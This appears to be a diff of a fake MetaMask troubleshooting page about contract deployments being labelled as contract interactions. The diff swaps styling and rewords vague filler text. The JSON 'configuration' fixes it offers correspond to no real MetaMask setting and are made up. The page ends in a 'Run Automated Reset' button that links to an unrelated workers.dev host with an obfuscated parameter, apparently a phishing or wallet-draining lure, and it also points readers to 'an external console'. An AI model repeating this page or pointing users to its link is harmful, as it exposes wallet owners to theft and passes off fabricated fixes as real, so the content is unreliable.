@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #121214;
+        font-family: system-ui;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,36 +42,34 @@
 <h1>Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension may notice that contract deployments are incorrectly displayed as contract interactions within the activity section of the extension, leading to confusion and potential issues with tracking and managing on-chain activities.</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem notice that contract deployments are incorrectly displayed as contract interactions within the activity section of the extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension's activity tracking and display logic, where it fails to differentiate between contract deployments and interactions, causing the misclassification.</li>
+<li>The error occurs due to a bug in the Metamask extension's logic for categorizing and displaying different types of transactions and contract activities. This misclassification leads to confusion among users trying to track their transaction history and contract interactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily resolve the issue, users can attempt the following manual overrides:</li>
-<li>Clear the Metamask extension's cache and storage data</li>
-<li>Update the Metamask extension to the latest version available</li>
-<li>Utilize a custom JSON configuration to correct the display logic, as shown in the following example:</li>
+<li>To temporarily resolve this issue, users can attempt the following manual overrides:</li>
+<li>Clear the Metamask extension's cache and storage to ensure that outdated data is not causing the misclassification.</li>
+<li>Update the Metamask extension to the latest version, as newer versions may include fixes for known bugs.</li>
+<li>Utilize the following JSON configuration to manually correct the display of contract deployments:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;activity&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;contractDeployments&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;displayType&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;deployment&quot;</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;transactionTypeOverrides&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;contractDeployment&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Contract Deployment&quot;</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more granular control over your Ethereum interactions.</p>
+<p>Consider utilizing an external console for more complex configurations and overrides.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension version 10.11.0 or later</li>
-<li>Ethereum mainnet or compatible testnet connection</li>
-<li>Basic understanding of JSON configuration files</li>
+<li>Metamask extension installed and configured on a compatible browser.</li>
+<li>Basic understanding of Ethereum transaction types and contract interactions.</li>
+<li>Latest version of the Metamask extension installed to ensure access to the most recent bug fixes and features.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-tron-ethcall-returns-cpu-timeout-for-contract-view-fu.html">Java Tron Tron Ethcall Returns Cpu Timeout For Contract View Fu</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/java-tron-tron-ethcall-returns-cpu-timeout-for-contract-view-fu.html">Java Tron Tron Ethcall Returns Cpu Timeout For Contract View Fu</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
